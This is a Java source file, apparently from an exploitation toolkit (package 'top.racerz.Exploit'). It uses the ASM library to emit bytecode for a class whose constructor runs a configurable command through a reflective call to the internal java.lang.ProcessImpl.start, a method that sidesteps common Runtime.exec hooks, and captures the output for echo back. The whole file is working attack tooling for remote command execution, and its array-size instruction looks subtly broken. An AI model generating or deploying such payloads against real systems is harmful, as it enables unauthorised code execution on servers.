package top.racerz.Exploit;


import org.objectweb.asm.*;
import top.racerz.utils.StringUtil;


public class Command implements Opcodes {

    public static void insert(ClassWriter cw) {

        String[] command = StringUtil.getCurrentPropertiesValue("Command").split(" ");

        FieldVisitor fv;
        MethodVisitor mv;
        {
            fv = cw.visitField(ACC_PRIVATE, "result", "Ljava/lang/String;", null, null);
            fv.visitEnd();
        }
        {
            mv = cw.visitMethod(ACC_PUBLIC, "<init>", "()V", null, new String[]{"java/lang/Exception"});
            mv.visitCode();
            Label l0 = new Label();
            mv.visitLabel(l0);
            mv.visitLineNumber(11, l0);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitMethodInsn(INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
            Label l1 = new Label();
            mv.visitLabel(l1);
            mv.visitLineNumber(13, l1);

            mv.visitInsn(command.length + 3);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/String");

            int iConst = ICONST_0;
            for (String s : command) {
                mv.visitInsn(DUP);
                mv.visitInsn(iConst);
                mv.visitLdcInsn(s);
                mv.visitInsn(AASTORE);
                iConst += 1;
            }


            mv.visitVarInsn(ASTORE, 1);
            Label l2 = new Label();
            mv.visitLabel(l2);
            mv.visitLineNumber(15, l2);
            mv.visitLdcInsn("java.lang.ProcessImpl");
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Class", "forName", "(Ljava/lang/String;)Ljava/lang/Class;", false);
            mv.visitVarInsn(ASTORE, 2);
            Label l3 = new Label();
            mv.visitLabel(l3);
            mv.visitLineNumber(16, l3);
            mv.visitVarInsn(ALOAD, 2);
            mv.visitLdcInsn("start");
            mv.visitInsn(ICONST_5);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitLdcInsn(Type.getType("[Ljava/lang/String;"));
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_1);
            mv.visitLdcInsn(Type.getType("Ljava/util/Map;"));
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_2);
            mv.visitLdcInsn(Type.getType("Ljava/lang/String;"));
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_3);
            mv.visitLdcInsn(Type.getType("[Ljava/lang/ProcessBuilder$Redirect;"));
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_4);
            mv.visitFieldInsn(GETSTATIC, "java/lang/Boolean", "TYPE", "Ljava/lang/Class;");
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            mv.visitVarInsn(ASTORE, 3);
            Label l4 = new Label();
            mv.visitLabel(l4);
            mv.visitLineNumber(17, l4);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "setAccessible", "(Z)V", false);
            Label l5 = new Label();
            mv.visitLabel(l5);
            mv.visitLineNumber(18, l5);
            mv.visitVarInsn(ALOAD, 3);
            mv.visitInsn(ACONST_NULL);
            mv.visitInsn(ICONST_5);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_0);
            mv.visitVarInsn(ALOAD, 1);
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_1);
            mv.visitInsn(ACONST_NULL);
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_2);
            mv.visitLdcInsn(".");
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_3);
            mv.visitInsn(ACONST_NULL);
            mv.visitInsn(AASTORE);
            mv.visitInsn(DUP);
            mv.visitInsn(ICONST_4);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKESTATIC, "java/lang/Boolean", "valueOf", "(Z)Ljava/lang/Boolean;", false);
            mv.visitInsn(AASTORE);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitVarInsn(ASTORE, 4);
            Label l6 = new Label();
            mv.visitLabel(l6);
            mv.visitLineNumber(20, l6);
            mv.visitVarInsn(ALOAD, 4);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Object", "getClass", "()Ljava/lang/Class;", false);
            mv.visitLdcInsn("getInputStream");
            mv.visitInsn(ICONST_0);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;", false);
            mv.visitVarInsn(ASTORE, 5);
            Label l7 = new Label();
            mv.visitLabel(l7);
            mv.visitLineNumber(21, l7);
            mv.visitVarInsn(ALOAD, 5);
            mv.visitInsn(ICONST_1);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "setAccessible", "(Z)V", false);
            Label l8 = new Label();
            mv.visitLabel(l8);
            mv.visitLineNumber(22, l8);
            mv.visitVarInsn(ALOAD, 5);
            mv.visitVarInsn(ALOAD, 4);
            mv.visitInsn(ICONST_0);
            mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;", false);
            mv.visitTypeInsn(CHECKCAST, "java/io/InputStream");
            mv.visitVarInsn(ASTORE, 6);
            Label l9 = new Label();
            mv.visitLabel(l9);
            mv.visitLineNumber(24, l9);
            mv.visitTypeInsn(NEW, "java/io/ByteArrayOutputStream");
            mv.visitInsn(DUP);
            mv.visitMethodInsn(INVOKESPECIAL, "java/io/ByteArrayOutputStream", "<init>", "()V", false);
            mv.visitVarInsn(ASTORE, 7);
            Label l10 = new Label();
            mv.visitLabel(l10);
            mv.visitLineNumber(25, l10);
            mv.visitIntInsn(SIPUSH, 1024);
            mv.visitIntInsn(NEWARRAY, T_BYTE);
            mv.visitVarInsn(ASTORE, 8);
            Label l11 = new Label();
            mv.visitLabel(l11);
            mv.visitLineNumber(28, l11);
            mv.visitFrame(Opcodes.F_FULL, 9, new Object[]{"Command", "[Ljava/lang/String;", "java/lang/Class", "java/lang/reflect/Method", "java/lang/Object", "java/lang/reflect/Method", "java/io/InputStream", "java/io/ByteArrayOutputStream", "[B"}, 0, new Object[]{});
            mv.visitVarInsn(ALOAD, 6);
            mv.visitVarInsn(ALOAD, 8);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/InputStream", "read", "([B)I", false);
            mv.visitInsn(DUP);
            mv.visitVarInsn(ISTORE, 9);
            Label l12 = new Label();
            mv.visitLabel(l12);
            mv.visitInsn(ICONST_M1);
            Label l13 = new Label();
            mv.visitJumpInsn(IF_ICMPEQ, l13);
            Label l14 = new Label();
            mv.visitLabel(l14);
            mv.visitLineNumber(29, l14);
            mv.visitVarInsn(ALOAD, 7);
            mv.visitVarInsn(ALOAD, 8);
            mv.visitInsn(ICONST_0);
            mv.visitVarInsn(ILOAD, 9);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/ByteArrayOutputStream", "write", "([BII)V", false);
            mv.visitJumpInsn(GOTO, l11);
            mv.visitLabel(l13);
            mv.visitLineNumber(31, l13);
            mv.visitFrame(Opcodes.F_APPEND, 1, new Object[]{Opcodes.INTEGER}, 0, null);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitVarInsn(ALOAD, 7);
            mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/ByteArrayOutputStream", "toString", "()Ljava/lang/String;", false);
            mv.visitFieldInsn(PUTFIELD, "Command", "result", "Ljava/lang/String;");
            Label l15 = new Label();
            mv.visitLabel(l15);
            mv.visitLineNumber(33, l15);
            mv.visitVarInsn(ALOAD, 0);
            mv.visitMethodInsn(INVOKEVIRTUAL, "Command", "echo", "()V", false);
            Label l16 = new Label();
            mv.visitLabel(l16);
            mv.visitLineNumber(34, l16);
            mv.visitInsn(RETURN);
            Label l17 = new Label();
            mv.visitLabel(l17);
            mv.visitLocalVariable("this", "LCommand;", null, l0, l17, 0);
            mv.visitMaxs(6, 10);
            mv.visitEnd();
        }
    }


    public static void main(String[] args) {

    }

}
